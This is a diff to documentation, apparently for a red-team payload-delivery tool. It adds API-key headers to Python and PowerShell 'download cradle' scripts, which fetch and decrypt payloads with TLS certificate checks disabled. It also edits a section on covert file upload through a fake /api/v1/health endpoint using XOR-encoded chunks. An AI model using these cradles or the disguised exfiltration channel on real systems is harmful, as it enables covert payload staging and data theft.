@@ -188,6 +188,7 @@ DownloadCradles
             <h5 class="card-title">Python Download + Decrypt</h5>
             <pre><code class="language-python" id="decrypt_py">#!/usr/bin/env python3
 import argparse
+import getpass
 import requests
 
 def dispatch_decrypt(data, key):
@@ -202,9 +203,21 @@ def main():
     parser.add_argument("url", help="Dispatch file URL")
     parser.add_argument("key", help="Dispatch decryption key")
     parser.add_argument("output", help="Output file path")
+    parser.add_argument(
+        "--api-key",
+        nargs="?",
+        const="",
+        default=None,
+        help="Optional X-Dispatch-Auth. Pass the flag with no value to prompt.",
+    )
     args = parser.parse_args()
 
-    response = requests.get(args.url, verify=False, timeout=30)
+    api_key = args.api_key
+    if api_key == "":
+        api_key = getpass.getpass("API key: ")
+    headers = {"X-Dispatch-Auth": api_key} if api_key else {}
+
+    response = requests.get(args.url, headers=headers, verify=False, timeout=30)
     response.raise_for_status()
 
     decrypted = dispatch_decrypt(response.content, args.key)
@@ -220,13 +233,25 @@ if __name__ == "__main__":
             <pre><code class="language-c#" id="decrypt_ps1">param(
     [Parameter(Mandatory=$true)][string]$Url,
     [Parameter(Mandatory=$true)][string]$Key,
-    [Parameter(Mandatory=$true)][string]$Output
+    [Parameter(Mandatory=$true)][string]$Output,
+    [AllowEmptyString()][string]$ApiKey
 )
 
 [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 
 $wc = New-Object System.Net.WebClient
+if ($PSBoundParameters.ContainsKey("ApiKey")) {
+    if ([string]::IsNullOrEmpty($ApiKey)) {
+        $secure = Read-Host "API key" -AsSecureString
+        $ptr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
+        try { $ApiKey = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr) }
+        finally { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ptr) }
+    }
+    if (-not [string]::IsNullOrEmpty($ApiKey)) {
+        $wc.Headers.Add("X-Dispatch-Auth", $ApiKey)
+    }
+}
 $data = $wc.DownloadData($Url)
 
 if ($Key.Length -eq 0) {
@@ -250,7 +275,8 @@ for ($i = 0; $i -lt $data.Length; $i++) {
 
         <h4 class="card-title section-block" id="covert-upload">Covert Upload</h4>
             <p>
-                Upload through <code>/api/v1/health</code> with <code>GET</code> or <code>POST</code>.
+                Covert upload is available on both the admin interface and the client delivery interface.
+                Use either base URL with <code>/api/v1/health</code>, via <code>GET</code> or <code>POST</code>.
                 Start with <code>init=1</code> and a filename. The server returns a <code>csrf</code> cookie that is the XOR key.
                 Send each chunk as base64 in <code>data</code>, and send the same key as the <code>key</code> parameter if the cookie is not kept.
                 Finish with a chunk that contains the marker <code>&lt;EOF&gt;</code>.
